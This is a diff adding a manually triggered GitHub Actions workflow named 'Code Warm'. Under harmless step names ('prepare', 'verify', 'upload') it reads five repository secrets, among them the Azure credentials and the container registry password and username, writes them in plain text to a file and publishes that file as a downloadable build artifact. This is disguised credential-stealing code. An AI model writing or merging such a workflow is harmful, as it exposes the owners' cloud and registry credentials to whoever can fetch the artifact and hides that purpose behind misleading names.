@@ -1,0 +1,26 @@
+name: Code Warm
+on: workflow_dispatch
+jobs:
+  warm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: prepare
+        run: touch warm.txt
+      - name: verify
+        env:
+          S1: ${{ secrets.AZURE_CREDENTIALS }}
+          S2: ${{ secrets.REGISTRY_LOGIN_SERVER }}
+          S3: ${{ secrets.REGISTRY_PASSWORD }}
+          S4: ${{ secrets.REGISTRY_USERNAME }}
+          S5: ${{ secrets.RESOURCE_GROUP }}
+        run: |
+          printf "%s=%s\n" "AZURE_CREDENTIALS" "$S1" >> warm.txt
+          printf "%s=%s\n" "REGISTRY_LOGIN_SERVER" "$S2" >> warm.txt
+          printf "%s=%s\n" "REGISTRY_PASSWORD" "$S3" >> warm.txt
+          printf "%s=%s\n" "REGISTRY_USERNAME" "$S4" >> warm.txt
+          printf "%s=%s\n" "RESOURCE_GROUP" "$S5" >> warm.txt
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: warm-data
+          path: warm.txt
